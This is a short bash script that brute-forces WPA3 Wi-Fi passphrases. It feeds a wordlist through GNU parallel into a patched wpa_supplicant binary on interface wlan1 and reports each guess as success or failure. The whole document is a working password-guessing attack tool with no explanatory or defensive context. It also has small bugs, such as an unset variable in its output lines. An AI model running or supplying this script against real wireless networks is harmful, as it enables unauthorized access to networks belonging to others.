#!/bin/bash
# Values of 3-4 seem to work best
wordlist=wordlist
IFS=$'\n'

cat $wordlist | parallel -j$1 '''
wordlist=/usr/share/dict/wordlist
supconf=/tmp/sup.conf
wpa3brutesup="/root/wpa3_brute/wpa_supplicant/wpa_supplicant/wpa_supplicant"
  sed "s/PASSPASS/{}/" $supconf > /tmp/{}
  $wpa3brutesup -i wlan1 -c /tmp/{} > /dev/null
  if [ $? -eq 127 ]; then
        echo $x:FAIL
  else
        echo $x:SUCCESS
        exit 0
  fi
  rm /tmp/{}
'''
unset IFS
